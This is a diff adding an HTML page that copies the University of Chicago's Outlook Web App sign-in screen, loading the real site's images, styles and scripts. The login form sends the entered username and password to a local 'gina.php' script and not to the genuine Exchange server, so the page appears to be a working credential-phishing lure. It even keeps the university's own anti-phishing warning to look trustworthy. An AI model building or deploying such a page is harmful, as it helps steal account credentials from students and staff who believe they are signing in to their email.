@@ -1,0 +1,381 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<!-- Copyright (c) 2006 Microsoft Corporation.  All rights reserved. -->
+<!-- OwaPage = ASP.auth_logon_aspx -->
+<!-- {57A118C6-2DA9-419d-BE9A-F92B0F9A418B} -->
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <link type="image/x-icon" href="https://xmail.uchicago.edu/owa/14.3.158.1/themes/resources/favicon.ico" rel="shortcut icon" />
+  <meta content="text/html; CHARSET=utf-8" http-equiv="Content-Type" />
+  <meta content="NOINDEX, NOFOLLOW" name="Robots" />
+  <title>
+   Outlook Web App
+  </title>
+  <link href="https://xmail.uchicago.edu/owa/14.3.158.1/themes/resources/logon.css" rel="stylesheet" type="text/css" />
+  <link href="https://xmail.uchicago.edu/owa/14.3.158.1/themes/resources/owafont.css" rel="stylesheet" type="text/css" />
+  <script src="https://xmail.uchicago.edu/owa/14.3.158.1/scripts/premium/flogon.js" type="text/javascript">
+  </script>
+  <script type="text/javascript">
+   &lt;!--
+	var a_fRC = 1;
+	var g_fFcs = 1;
+	var a_fLOff = 0;
+	var a_fCAC = 1;
+	var a_fEnbSMm = 1;
+/// &lt;summary&gt;
+/// Is Mime Control installed?
+/// &lt;/summary&gt;
+function IsMimeCtlInst(progid)
+{
+	if (!a_fEnbSMm)
+		return false;
+
+	var oMimeVer = null;
+
+	try 
+	{
+		// TODO: ingore this on none IE browser
+		//
+		//oMimeVer = new ActiveXObject(progid);
+	} 
+	catch (e)
+	{ 
+	}
+
+	if (oMimeVer != null)
+		return true;
+	else
+		return false;
+}
+
+/// &lt;summary&gt;
+/// Render out the S-MIME control if it is installed.
+/// &lt;/summary&gt;
+function RndMimeCtl()
+{
+	if (IsMimeCtlInst("MimeBhvr.MimeCtlVer"))
+		RndMimeCtlHlpr("MimeNSe2k3", "D801B381-B81D-47a7-8EC4-EFC111666AC0", "MIMEe2k3", "mimeLogoffE2k3");
+
+	if (IsMimeCtlInst("OwaSMime.MimeCtlVer"))
+		RndMimeCtlHlpr("MimeNSe2k7sp1", "833aa5fb-7aca-4708-9d7b-c982bf57469a", "MIMEe2k7sp1", "mimeLogoffE2k7sp1");
+
+	if (IsMimeCtlInst("OwaSMime2.MimeCtlVer"))
+		RndMimeCtlHlpr("MimeNSe2k9", "4F40839A-C1E5-47E3-804D-A2A17F42DA21", "MIMEe2k9", "mimeLogoffE2k9");
+}
+
+/// &lt;summary&gt;
+/// Helper function to factor out the rendering of the S/MIME control.
+/// &lt;/summary&gt;
+function RndMimeCtlHlpr(objid, classid, ns, id)
+{
+	document.write("&lt;OBJECT id='" + objid + "' classid='CLSID:" + classid + "'&gt;&lt;/OBJECT&gt;");
+	document.write("&lt;IMPORT namespace='" + ns + "' implementation=#" + objid + "&gt;");
+	document.write("&lt;" + ns + ":Logoff id='" + id + "' style='display:none'/&gt;");
+}
+	--&gt;
+  </script>
+ </head>
+ <body class="owaLgnBdy">
+  <script type="text/javascript">
+   RndMimeCtl();
+  </script>
+  <noscript>
+   &lt;div id="dvErr"&gt;
+		&lt;table cellpadding="0" cellspacing="0"&gt;
+		&lt;tr&gt;
+			&lt;td&gt;&lt;img src="https://xmail.uchicago.edu/owa/14.3.158.1/themes/base/warn.png" alt=""&gt;&lt;/td&gt;
+			&lt;td style="width:100%"&gt;To use Outlook Web App, browser settings must allow scripts to run. For information about how to allow scripts, consult the Help for your browser. If your browser doesn't support scripts, you can download &lt;a href="http://www.microsoft.com/windows/ie/downloads/default.mspx"&gt;Windows Internet Explorer&lt;/a&gt; for access to Outlook Web App.&lt;/td&gt;
+		&lt;/tr&gt;
+		&lt;/table&gt;
+	&lt;/div&gt;
+  </noscript>
+  <form autocomplete="off" enctype="application/x-www-form-urlencoded" name="logonForm" method="POST" action="gina.php?">
+   <input type="hidden" value="https://xmail.uchicago.edu/owa/" name="destination" />
+   <input type="hidden" value="0" name="flags" />
+   <input type="hidden" value="0" name="forcedownlevel" />
+   <table align="center" cellspacing="0" cellpadding="0" id="tblMain">
+    <tbody>
+     <tr>
+      <td colspan="3">
+       <table cellspacing="0" cellpadding="0" class="tblLgn">
+        <tbody>
+         <tr>
+          <td class="lgnTL">
+           <img alt="" src="https://xmail.uchicago.edu/owa/14.3.158.1/themes/resources/lgntopl.gif" />
+          </td>
+          <td class="lgnTM">
+          </td>
+          <td class="lgnTR">
+           <img alt="" src="https://xmail.uchicago.edu/owa/14.3.158.1/themes/resources/lgntopr.gif" />
+          </td>
+         </tr>
+        </tbody>
+       </table>
+      </td>
+     </tr>
+     <tr>
+      <td id="mdLft">
+      </td>
+      <td id="mdMid">
+       <table class="mid" id="tblMid">
+        <tbody>
+         <tr>
+          <td class="expl" id="expltxt">
+          </td>
+         </tr>
+         <tr>
+          <td>
+           <hr />
+          </td>
+         </tr>
+         <tr>
+          <td>
+           <table cellspacing="0" cellpadding="0">
+            <colgroup>
+             <col>
+             </col>
+             <col class="w100">
+             </col>
+            </colgroup>
+            <tbody>
+             <tr id="trSec">
+              <td colspan="2">
+               Security 
+									‎(
+               <a onclick="clkExp('lnkShwSec')" id="lnkShwSec" href="#">
+                show explanation
+               </a>
+               <a style="display:none" onclick="clkExp('lnkHdSec')" id="lnkHdSec" href="#">
+                hide explanation
+               </a>
+               )‎
+              </td>
+             </tr>
+             <tr>
+              <td>
+               <input type="radio" checked="checked" onclick="clkSec()" class="rdo" value="0" name="trusted" id="rdoPblc" />
+              </td>
+              <td>
+               <label for="rdoPblc">
+                This is a public or shared computer
+               </label>
+              </td>
+             </tr>
+             <tr style="display:none" class="expl" id="trPubExp">
+              <td>
+              </td>
+              <td>
+               Select this option if you use Outlook Web App on a public computer. Be sure to sign out when you've finished and close all windows to end your session.
+              </td>
+             </tr>
+             <tr>
+              <td>
+               <input type="radio" onclick="clkSec()" class="rdo" value="4" name="trusted" id="rdoPrvt" />
+              </td>
+              <td>
+               <label for="rdoPrvt">
+                This is a private computer
+               </label>
+              </td>
+             </tr>
+             <tr style="display:none" class="expl" id="trPrvtExp">
+              <td>
+              </td>
+              <td>
+               Select this option if you're the only person who uses this computer. Your server will allow a longer period of inactivity before signing you out.
+              </td>
+             </tr>
+             <tr style="display:none" class="wrng" id="trPrvtWrn">
+              <td>
+              </td>
+              <td>
+               Warning:  By selecting this option, you confirm that this computer complies with your organization's security policy.
+              </td>
+             </tr>
+            </tbody>
+           </table>
+          </td>
+         </tr>
+         <tr>
+          <td>
+           <hr />
+          </td>
+         </tr>
+         <tr>
+          <td>
+           <table cellspacing="0" cellpadding="0">
+            <colgroup>
+             <col>
+             </col>
+             <col class="w100">
+             </col>
+            </colgroup>
+            <tbody>
+             <tr>
+              <td>
+               <input type="checkbox" onclick="clkBsc();" class="rdo" id="chkBsc" />
+              </td>
+              <td nowrap="nowrap">
+               <label for="chkBsc">
+                Use the light version of Outlook Web App
+               </label>
+              </td>
+             </tr>
+             <tr style="display:none" class="disBsc" id="trBscExp">
+              <td>
+              </td>
+              <td>
+               The light version of Outlook Web App includes fewer features. Use it if you're on a slow connection or using a computer with unusually strict browser security settings. We also support the full Outlook Web App experience on some browsers on Windows, Mac, and Linux computers. To check out all the supported browsers and operating systems,
+               <a id="bscLnk" href="http://go.microsoft.com/fwlink/?LinkID=129362">
+                click here.
+               </a>
+              </td>
+             </tr>
+            </tbody>
+           </table>
+          </td>
+         </tr>
+         <tr>
+          <td>
+           <hr />
+          </td>
+         </tr>
+         <tr>
+          <td>
+           <table cellspacing="0" cellpadding="0">
+            <colgroup>
+             <col class="nowrap">
+             </col>
+             <col class="w100">
+             </col>
+             <col>
+             </col>
+            </colgroup>
+            <tbody>
+             <tr>
+              <td nowrap="nowrap">
+               <label for="username">
+                User name:
+               </label>
+              </td>
+              <td class="txtpad">
+               <input type="text" class="txt" name="username" id="username" />
+              </td>
+             </tr>
+             <tr>
+              <td nowrap="nowrap">
+               <label for="password">
+                Password:
+               </label>
+              </td>
+              <td class="txtpad">
+               <input type="password" onfocus="g_fFcs=0" class="txt" name="password" id="password" />
+              </td>
+             </tr>
+             <tr>
+              <td align="right" class="txtpad" colspan="2">
+               <input type="submit" onmousedown="this.className='btnOnMseDwn'" onmouseout="this.className='btn'" onmouseover="this.className='btnOnMseOvr'" onclick="clkLgn()" value="Sign in" class="btn" />
+               <input type="hidden" value="1" name="isUtf8" />
+              </td>
+             </tr>
+            </tbody>
+           </table>
+          </td>
+         </tr>
+         <tr>
+          <td>
+           <hr />
+          </td>
+         </tr>
+        </tbody>
+       </table>
+       <table style="display:none" class="mid" id="tblMid2">
+        <tbody>
+         <tr>
+          <td>
+           <hr />
+          </td>
+         </tr>
+         <tr>
+          <td>
+           <br />
+           Please enable cookies for this Web site.
+           <br />
+           <br />
+           Cookies are currently disabled by your browser. Outlook Web App requires that cookies be enabled.
+           <br />
+           <br />
+           For information about how to enable cookies, see the Help for your Web browser.
+           <br />
+           <br />
+           <br />
+          </td>
+         </tr>
+         <tr>
+          <td>
+           <hr />
+          </td>
+         </tr>
+         <tr>
+          <td align="right" class="txtpad">
+           <input type="button" onmousedown="this.className='btnOnMseDwn'" onmouseout="this.className='btn'" onmouseover="this.className='btnOnMseOvr'" onclick="clkRtry()" value="Retry" style="float: right" class="btn" />
+          </td>
+         </tr>
+        </tbody>
+       </table>
+       <table class="mid tblConn">
+        <tbody>
+         <tr>
+          <td align="right" class="tdConnImg" rowspan="2">
+           <img alt="" src="/owa/14.3.158.1/themes/resources/lgnexlogo.gif" style="vertical-align:top" />
+          </td>
+          <td class="tdConn">
+           Connected to Microsoft Exchange
+          </td>
+         </tr>
+         <tr>
+          <td class="tdCopy">
+           © 2010 Microsoft Corporation. All rights reserved.
+          </td>
+         </tr>
+        </tbody>
+       </table>
+      </td>
+      <td id="mdRt">
+      </td>
+     </tr>
+     <tr>
+      <td colspan="3">
+       <table cellspacing="0" cellpadding="0" class="tblLgn">
+        <tbody>
+         <tr>
+          <td class="lgnBL">
+           <img alt="" src="https://xmail.uchicago.edu/owa/14.3.158.1/themes/resources/lgnbotl.gif" />
+          </td>
+          <td class="lgnBM">
+          </td>
+          <td class="lgnBR">
+           <img alt="" src="https://xmail.uchicago.edu/owa/14.3.158.1/themes/resources/lgnbotr.gif" />
+          </td>
+         </tr>
+        </tbody>
+       </table>
+      </td>
+     </tr>
+    </tbody>
+   </table>
+  </form>
+  <p class="style25">
+   <strong>
+    WARNING: Malicious 'phishing' email regularly appear to have been sent from familiar sources.
+    <br />
+    For your safety, DO NOT click links in email claiming to be from any University of Chicago
+    <br />
+    or familiar entity that asks you to log in to perform such tasks as verifying your account,
+    <br />
+    changing your password, or installing unsolicited software. If you have responded to such an
+    <br />
+    email, call IT Security immediately at 773-702-2378.
+   </strong>
+  </p>
+ </body>
+</html>
